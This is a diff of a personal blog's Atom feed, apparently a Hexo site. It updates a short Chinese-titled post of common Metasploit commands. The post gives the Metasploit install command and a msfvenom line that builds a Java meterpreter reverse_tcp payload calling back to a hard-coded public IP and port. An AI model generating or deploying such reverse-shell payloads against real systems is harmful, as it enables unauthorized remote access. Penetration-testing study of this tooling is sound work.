@@ -48,22 +48,20 @@
   </entry>
   
   <entry>
-    <title>msf_shell</title>
+    <title>msf常用命令</title>
     <link href="https://10o0.github.io/2018/01/18/msf-shell/"/>
     <id>https://10o0.github.io/2018/01/18/msf-shell/</id>
     <published>2018-01-18T02:22:16.000Z</published>
-    <updated>2018-01-18T02:26:51.339Z</updated>
+    <updated>2018-01-19T06:33:55.134Z</updated>
     
-    <content type="html"><![CDATA[<pre><code>java/meterpreter/reverse_tcpmsfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar</code></pre>]]></content>
+    <content type="html"><![CDATA[<p>Msf安装：</p><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><hr><p>Msfshell</p><pre><code>java/meterpreter/reverse_tcpmsfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar</code></pre>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;pre&gt;&lt;code&gt;java/meterpreter/reverse_tcp
-
-msfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar
-
+        &lt;p&gt;Msf安装：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrapp
       
     
     </summary>
